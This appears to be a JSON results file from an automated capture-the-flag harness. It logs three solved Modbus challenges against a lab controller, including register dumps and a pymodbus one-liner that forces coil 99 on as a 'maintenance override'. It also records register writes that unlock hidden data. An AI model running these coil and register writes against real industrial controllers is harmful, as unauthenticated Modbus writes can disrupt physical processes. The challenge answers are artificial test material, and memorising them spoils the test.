@@ -1,0 +1,69 @@
+{
+  "summary": {
+    "run_at_utc": "2026-04-16T03:08:32.075865+00:00",
+    "protocols": [
+      "enip",
+      "modbus"
+    ],
+    "selected_cases": 3,
+    "skipped_cases": [],
+    "executed_cases": 3,
+    "success_count": 3,
+    "avg_ttr_min": 0.0,
+    "total_improve_min_vs_prev": 0.104,
+    "comparable_cases": 3
+  },
+  "results": [
+    {
+      "id": "modbus_chemtech_flag1_register_dump",
+      "protocol": "modbus",
+      "command": "python3 /home/kali/Desktop/.windsurf/skills/ctf-ics/tools/modbus/modbus_read_find_flags.py --ip 192.168.1.25 --port 502 --unit 1 --reg-start 0 --reg-end 350 --json",
+      "return_code": 0,
+      "success": true,
+      "failure_reason": "",
+      "import_error_detected": false,
+      "ttr_sec": 0.0,
+      "ttr_min": 0.0,
+      "prev_ttr_sec": 1.0881077290000007,
+      "improve_sec_vs_prev": 1.0881077290000007,
+      "improve_min_vs_prev": 0.018,
+      "stdout_tail": "",
+      "stderr_tail": "",
+      "notes_path": "/home/kali/Desktop/.windsurf/skills/ctf-ics/challenge_corpus/case_notes/modbus_chemtech_flag1_register_dump.md"
+    },
+    {
+      "id": "modbus_chemtech_flag2_maintenance_override",
+      "protocol": "modbus",
+      "command": "python3 -c \"from pymodbus.client import ModbusTcpClient as C; c=C('192.168.1.25',port=502,timeout=2); c.connect(); c.write_coil(address=99,value=True,slave=1); print(c.read_coils(address=99,count=1,slave=1).bits[0]); c.close()\"",
+      "return_code": 0,
+      "success": true,
+      "failure_reason": "",
+      "import_error_detected": false,
+      "ttr_sec": 0.0,
+      "ttr_min": 0.0,
+      "prev_ttr_sec": 4.071937852000005,
+      "improve_sec_vs_prev": 4.071937852000005,
+      "improve_min_vs_prev": 0.068,
+      "stdout_tail": "",
+      "stderr_tail": "",
+      "notes_path": "/home/kali/Desktop/.windsurf/skills/ctf-ics/challenge_corpus/case_notes/modbus_chemtech_flag2_maintenance_override.md"
+    },
+    {
+      "id": "modbus_chemtech_flag3_rgb_formula",
+      "protocol": "modbus",
+      "command": "python3 /home/kali/Desktop/.windsurf/skills/ctf-ics/tools/modbus/modbus_stateful_decoder.py --ip 192.168.1.25 --port 502 --unit 1 --trigger-coil 99 --set-registers \"32=16,33=63,34=21,35=80,50=32,51=126,52=42\" --decode-ranges \"100:100,200:100,300:100,400:100\" --follow-hr-clue --json",
+      "return_code": 0,
+      "success": true,
+      "failure_reason": "",
+      "import_error_detected": false,
+      "ttr_sec": 0.0,
+      "ttr_min": 0.0,
+      "prev_ttr_sec": 1.0686810369999904,
+      "improve_sec_vs_prev": 1.0686810369999904,
+      "improve_min_vs_prev": 0.018,
+      "stdout_tail": "",
+      "stderr_tail": "",
+      "notes_path": "/home/kali/Desktop/.windsurf/skills/ctf-ics/challenge_corpus/case_notes/modbus_chemtech_flag3_rgb_formula.md"
+    }
+  ]
+}
